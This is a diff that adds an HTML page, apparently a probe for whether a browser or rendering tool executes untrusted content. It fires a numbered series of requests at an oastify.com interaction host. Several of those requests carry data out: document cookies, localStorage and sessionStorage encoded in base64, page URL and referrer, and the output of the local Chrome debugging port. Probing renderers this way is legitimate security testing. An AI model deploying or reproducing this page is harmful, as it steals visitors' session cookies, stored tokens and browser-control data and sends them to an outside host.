@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <link rel="stylesheet" 
+    href="http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/01-css-tag">
+  <script src="http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/02-script-tag">
+  </script>
+</head>
+<body>
+
+  <img src="http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/03-img-tag">
+
+  <iframe src="http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/04-iframe" 
+    width="1" height="1"></iframe>
+
+  <h1 style="font-size:200px;color:red">ZOOM_VISIBLE_TEST</h1>
+
+  <script>
+
+    // Test 5: fetch API
+    fetch("http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/05-fetch-api");
+
+    // Test 6: XHR
+    var x = new XMLHttpRequest();
+    x.open("GET", 
+      "http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/06-xhr");
+    x.send();
+
+    // Test 7: Environment info
+    fetch("http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/07-env?" + 
+      new URLSearchParams({
+        url:     window.location.href,
+        origin:  window.location.origin,
+        cookies: document.cookie,
+        ua:      navigator.userAgent,
+        referrer: document.referrer
+      })
+    );
+
+    // Test 8: Screen dimensions
+    fetch("http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/08-dims?" + 
+      new URLSearchParams({
+        sw: screen.width,
+        sh: screen.height,
+        ww: window.innerWidth,
+        wh: window.innerHeight
+      })
+    );
+
+    // Test 9: WebSocket
+    try {
+      var ws = new WebSocket(
+        "ws://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/09-websocket"
+      );
+      ws.onopen = function() {
+        fetch("http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/09-ws-open");
+      };
+    } catch(e) {
+      fetch("http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/09-ws-blocked");
+    }
+
+    // Test 10: localStorage
+    try {
+      fetch("http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/10-ls?d=" 
+        + btoa(JSON.stringify(localStorage) || "empty"));
+    } catch(e) {
+      fetch("http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/10-ls-blocked");
+    }
+
+    // Test 11: sessionStorage
+    try {
+      fetch("http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/11-ss?d=" 
+        + btoa(JSON.stringify(sessionStorage) || "empty"));
+    } catch(e) {
+      fetch("http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/11-ss-blocked");
+    }
+
+    // Test 12: Chrome debug port
+    fetch("http://localhost:9222/json")
+      .then(r => r.text())
+      .then(d => fetch(
+        "http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/12-debug-open?d=" 
+        + btoa(d)))
+      .catch(() => fetch(
+        "http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/12-debug-blocked"));
+
+    // Test 13: meta refresh
+    // (separate from JS — in head above)
+
+    // Test 14: unique proof
+    fetch("http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/14-js-ran-" 
+      + Date.now() + "-" + Math.random());
+
+  </script>
+
+  <meta http-equiv="refresh" 
+    content="5;url=http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/13-meta-refresh">
+
+</body>
+</html>
